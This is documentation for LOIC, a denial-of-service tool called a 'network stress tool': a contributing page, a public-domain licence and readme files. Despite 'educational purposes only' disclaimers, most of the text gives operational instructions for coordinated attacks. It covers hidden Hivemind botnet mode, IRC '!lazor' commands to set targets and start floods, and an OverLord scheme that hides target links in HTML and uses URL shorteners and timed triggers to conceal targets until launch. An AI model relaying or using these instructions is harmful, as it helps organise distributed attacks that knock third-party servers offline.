## Contribute

The project authors welcome contributions, big or small. Members of the community frequently contribute bug fixes, enhancements, and documentation changes to improve the functionality and usability of the software.

All of the project source code is on Github. We recommend potential contributors familiarize themselves with [the project git repository](https://github.com/NewEraCracker/LOIC) and Github in general.

If you want to contribute but do not have a specific topic in mind, review the [list of open bug reports and other issues that are in need of attention](https://github.com/NewEraCracker/LOIC/issues).

Changes may be submitted as [pull requests on github](https://help.github.com/articles/using-pull-requests/). After being submitted, project maintainers will review the requests, offer feedback, and merge the changes if they are acceptable.## Newfag's Low Orbit Ion Cannon - End User License Agreement

## 1. Parties and Scope

This agreement (or "License") is celebrated between two parties: Project Authors and Contributors - herein "We", "Us", "Licensor"; and the End User - herein "You", "Licensee".

This agreement governs use of the accompanying software (the "Work"). If you use the software, you accept this License. If you decline the License, do not use the software.

**You may not use this software for any illegal or unethical purpose; including activities which would give rise to criminal or civil liability.**

## 2. Grant of Rights

Licensor hereby either (a) certifies that, to the best of his knowledge, the work of authorship identified is in the public domain of the country from which the work is published, or (b) hereby dedicates whatever copyright the Licensor holds in the Work of authorship to the public domain. The Licensor, moreover, dedicates any copyright interest he may have in the associated Work, and for these purposes, is described as a "Dedicator" below.

Licensor has taken reasonable steps to verify the copyright status of this Work, and recognizes that his good faith efforts may not shield him from liability if in fact the Work certified is not in the public domain.

Dedicator makes this dedication for the benefit of the public at large and to the detriment of the Dedicator's heirs and successors. Dedicator intends this dedication to be an overt act of relinquishment in perpetuity of all present and future rights under copyright law, whether vested or contingent, in the Work. Dedicator understands that such relinquishment of all rights includes the relinquishment of all rights to enforce (by lawsuit or otherwise) those copyrights in the Work.

Dedicator recognizes that, once placed in the public domain, the Work may be freely reproduced, distributed, transmitted, used, modified, built upon, or otherwise exploited by anyone for any purpose, commercial or non-commercial, and in any way, including by methods that have not yet been invented or conceived.

## 3. Conditions and Limitations

The Work is licensed "AS-IS". You bear the risk of using it. The Licensor gives no express warranties, guarantees, or conditions. You may have additional consumer rights under your local laws which this license cannot change. To the extent permitted under your local laws, the Licensor excludes the implied warranties of merchantability, fitness for a particular purpose and non-infringement.

The Work is released for educational purposes only, with the intent of helping to develop an "Hacker Defense" attitude.

**Under no event shall the Licensor be responsible for the activities, or any misdeeds, conducted by the Licensee.**==========
|| INFO ||
==========

Low Orbit Ion Cannon - An open source network stress tool. Written in C#
Based on Praetox's loic project at https://sourceforge.net/projects/loic/. 

================
|| Help - dox ||
================

There is now  an online help available. Press <F1>, read the .chm file or got in the source to the help/web folder and read there!

================
|| DISCLAIMER ||
================

I, NewEraCracker, am not responsible for the use that you give to this tool.
You cannot blame me if you use this tool to attack servers you don't own and get caught.
This tool is released for educational purposes only and comes with no warranty at all.

===========================
|| HOW TO RUN IN WINDOWS ||
===========================

GET THE BINARIES!

Requires Microsoft .NET Framework 3.5 Service Pack 1 available at
http://www.microsoft.com/downloads/en/details.aspx?FamilyID=ab99342f-5d1a-413d-8319-81da479ab0d7&displaylang=en

=========================
|| HOW TO RUN IN LINUX ||
=========================

You'll need mono and log4net:

# sudo apt-get install mono liblog4net-cil-dev

Then, build it:

# mdtool build

And run it!

# bin/Debug/LOIC.exe

==========================
|| HIVEMIND/HIDDEN MODE ||
==========================

HIVE MIND mode will connect your client to an IRC server so it can be controlled
remotely. Think of it like a voluntary botnet. They might even make your client
do naughty things, so beware.

Note: It does NOT allow remote administration of your machine, or anything shit
like that, it is literally just control of loic itself.

If you want to start up in hivemind, run like this:
 LOIC.exe /hivemind irc.server.address
It will connect to irc://irc.server.adress:6667/loic

You can also specify port and channel
 LOIC.exe /hivemind irc.server.address 1234 #secret
It will connect to irc://irc.server.adress:1234/secret

In order to do hivemind hidden run like this:
 LOIC.exe /hidden /hivemind irc.server.address
It will connect to irc://irc.server.adress:6667/loic without any visible GUI

==============================
|| CONTROLING LOIC FROM IRC ||
==============================

As an OP, Admin or Owner set a channel topic or type message with (as an example):
!lazor targetip=127.0.0.1 message=test_test port=80 method=tcp wait=false random=true

To start attack type
!lazor start

Or just append "start" in the END of the topic
!lazor targetip=127.0.0.1 message=test_test port=80 method=tcp wait=false random=true start

To reset options back to default:
!lazor default

To stop attack:
!lazor stop

And remove "start" from topic (if exists)
You can also replace "start" by "stop" in the END of the topic.

Take a look at source for more details.

==================================
|| CONTROLING LOIC OVER THE WEB ||
==================================

>> Press <F10> for easy copy & paste of HiveMind / OverLord Settings <<


The OverLord-Mode is meant as a Fail-Save mechanism to allow easy (de)centralised control in exactly the same way as HiveMind does.

The information is encoded into hyperlinks and allows though an easy and secure distribution way. 
!!URL-Shortener and Redirectors are fully supported!!


-SYNTAX-
There are 3 Methods:
---

I. Plain-Text Links: can ONLY specify TARGETS
"LOIC: {OL-URI}"

---

II: a-href Links: 
II.a: Back-Up Mirrors - they contain no target information and point to sites, where target are posted.
'class="LO bu" href="{URI}"' - read diretion top to bottom
'class="LO bu r" href="{URI}"' - read direcion bottom to top

the read direction depends on the site: e.g. for twitter, where the newest post is on the top, you want to scan the site top-to-bottom for targets.
On Blogs / Boards where the newest posts are at the bottom, you want to scan in the reverse direction.

In the GUI the checkbox "Up?" scans top-to-bottom if checked and reverse otherwise.

The scan stops at the first encountered target and uses this as the current target - all BackUp Mirrors up to this point are stored. (mirrors after the 1st target in read-direction are ignored)

II.b: Target-Links
'class="LO tar" href="{OL-URI}"'

---

III. Plain Text instruction (this is depreciated)
"[LOIC]
{command}:{value}
{command}:{value}
...
[/LOIC]"

if there is a "lot" of html-code merged into the text it is best to use the "@"-Delimeter:
"[LOIC]@{command}:{value}@<html goes here>@{command}:{value}@......[/LOIC]"

---------

The URI-Syntax for Targets:
{OL-URI} = {URI}@{command}={value}@{single_sign}@{command}={value}@...

IT IS HIGHLY RECOMMENDED TO USE URL-SHORTENER FOR THE TARGET-COMMANDS!!

---

Commands: THESE APPLY ONLY TO TARGET-LINKS as in method II.b or PLAINT Text as in method III!!!!!
(there are 2 new commands - the others are the same as on IRC)

targetip, targethost, timeout, subsite, message, port, method, threads, wait, random, speed

hivemind - let's you set an Hive-Mind-Server over OverLord: @hivemind=irc.cooldomin.heros:6667#hivemind@
if this command is used the control is immediately transferred to the HiveMind! (aka: OverLord STOPS working!)
therefor the hivemind command is best used alone without other commands.

time - you can set a timer for the beginning of the fun: @time=YYYY/MM/DD HH:mm@ (time-zone is UTC for the time - the time-zone-correction is done by the client according to the system-settings and time!)
if a time command is issued the current attack stops and the Lazor waits until the time is reached. the target-information is updated once again EXACTLY at the beginning of the attack.

Using this it is possible, to set a time for all "connected" lazors WITHOUT revealing the target:
1. http://hive.mind/go.hp?@time=2010/05/23 15:00@
at 14:55 (UTC) you just change the Link to: http://hive.mind/go.hp?@time=2010/05/23 15:00@&@targetip=127.0.0.1@

-------------------

... enough with the crap - a real world example:
On site http://main.com is the command center where you don't want to post target-information:
put somewhere on your site (in a .php / .txt / .html / .js or whatever file you have) the Back-Up-Mirrors for your OP:

<a class="LO bu" href="http://somefree-hoster.com/url/yourbackup">&nbsp</a>
<a class="LO bu" href="http://twitter.com/account">&nbsp</a>
<a class="LO bu r" href="http://xyx.chan.com/b/1234">&nbsp</a>
<a class="LO bu" href="http://bit.ly">&nbsp</a>

As soon as one mirror fails the next is taken - the mirrors are accumulated at the client - so you can change them or add more atfer the majority of the nodes have read them once! .. Back-Up-Mirrors are only removed from the client, if one seems to be offline. (the effects of the Stress-Test on the client machine is (to some degree) mitigated!)

it might be a good idea, to hide the "LO"-Class with a (inline-) CSS or put it into any hidden container ... or just leave as is :D

ATTENTION: Backup Mirrors + Targets in one Page!
Pay attention to the scan-direction! If you read top-to-bottom (Up? = checked in the GUI) you HAVE TO PUT your mirrors BEFORE the first target-link!
if you scan reverse you have to put the mirrors BELOW the target!

e.g. Scanning REVERSE + Mixed-Mode
<html-code>
<p>your very long paragraph LOIC: http://bit.ly/abcde your paragraph contniues on for ours</p>
<more html>
<a style="display:none" class="LO bu" href="http://bit.ly">&nbsp</a>
<footer-stuff>

that's pretty much it xD
## INFO

Low Orbit Ion Cannon (**LOIC**) is an open source network stress tool, written in C#.
LOIC is based on Praetox's LOIC project at https://sourceforge.net/projects/loic/ .

## DISCLAIMER

LOIC is for educational purposes only, intended to help server owners develop a "hacker defense" attitude. This tool comes without any warranty.

**You may not use this software for illegal or unethical purposes. This includes activities which give rise to criminal or civil liability.**

**Under no event shall the licensor be responsible for any activities, or misdeeds, by the licensee.**

## HOW TO RUN ON WINDOWS

GET THE BINARIES!

Requires Microsoft .NET Framework 3.5 Service Pack 1, available at:
http://www.microsoft.com/downloads/en/details.aspx?FamilyID=ab99342f-5d1a-413d-8319-81da479ab0d7&displaylang=en

## HOW TO RUN ON LINUX / MACOSX

Run debug binaries with Mono or Wine.
Read the wiki at https://github.com/NewEraCracker/LOIC/wiki/_pages for updated instructions.

## HIVEMIND/HIDDEN MODE

HIVEMIND mode will connect your client to an IRC server so it can be controlled remotely.
Think of this as a voluntary botnet. Please be aware that your client can potentially be
made to do naughty things.

Note: It does NOT allow remote administration of your machine; it 
just providees control of LOIC itself.

If you want to start up in Hivemind mode, run something such as this:
```
	LOIC.exe /hivemind irc.server.address
```
which will connect to irc://irc.server.adress:6667/loic

You can also specify a port and channel:
```
	LOIC.exe /hivemind irc.server.address 1234 #secret
```
which will connect to irc://irc.server.adress:1234/secret

In order to run Hivemind Hidden mode, run something such as this:
```
	LOIC.exe /hidden /hivemind irc.server.address
```
which will connect to irc://irc.server.adress:6667/loic without any visible GUI.

## CONTROLLING LOIC FROM IRC

As an OP, Admin or Owner, set the channel topic or send a message such as the following:
```
	!lazor targetip=127.0.0.1 message=test_test port=80 method=tcp wait=false random=true
```

To start an attack, type:
```
	!lazor start
```

or append "start" to the END of the topic:
```
	!lazor targetip=127.0.0.1 message=test_test port=80 method=tcp wait=false random=true start
```

To reset LOIC's options back to their defaults:
```
	!lazor default
```

To stop an attack:
```
	!lazor stop
```

and **be sure to remove "start" from the END of the topic**, if it exists, as well.

Take a look at the source code for more details.